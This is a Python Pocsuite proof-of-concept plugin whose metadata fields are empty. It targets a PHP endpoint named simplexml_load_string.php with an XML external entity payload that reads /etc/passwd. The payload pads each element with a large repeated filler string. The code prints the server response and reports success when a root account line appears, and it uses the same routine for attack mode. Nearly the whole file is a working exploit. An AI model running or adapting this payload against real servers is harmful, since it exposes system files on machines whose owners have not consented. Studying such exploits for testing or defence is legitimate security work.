#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from urlparse import urlparse, urljoin
from pocsuite.api.request import req


class TestPOC(POCBase):
    vulID = 'N/A'  # ssvid
    version = '1.0'
    author = ['co0ontty']
    vulDate = ''
    createDate = ''
    updateDate = ''
    references = ['']
    name = ''
    appPowerLink = ''
    appName = ''
    appVersion = 'N/A'
    vulType = ''
    desc = ''''''
    samples = ['']
    install_requires = ['']

    def _verify(self):
        result= {}
        target = urljoin(self.url,"/simplexml_load_string.php")
        http_body = '''<?xml version="1.0" encoding="utf-8"?> 
        <!DOCTYPE xxe [
            <!ELEMENT name ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >
            ]><root>
            <name>&xxe;'''+"010202030302"*50000+'''</name>
            <name>&xxe;'''+"010202030302"*50000+'''</name>
            <name>&xxe;'''+"010202030302"*50000+'''</name>
            <name>&xxe;'''+"010202030302"*50000+'''</name>
            </root>'''
        resp = req.post(target,data=http_body)
        print(resp.text.replace("010202030302",""))
        if "x:0:0:root" in resp.text:
            print(resp.text.replace("010202030302",""))
            result['VerifyInfo'] = "success"
        return self.parse_output(result)
    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
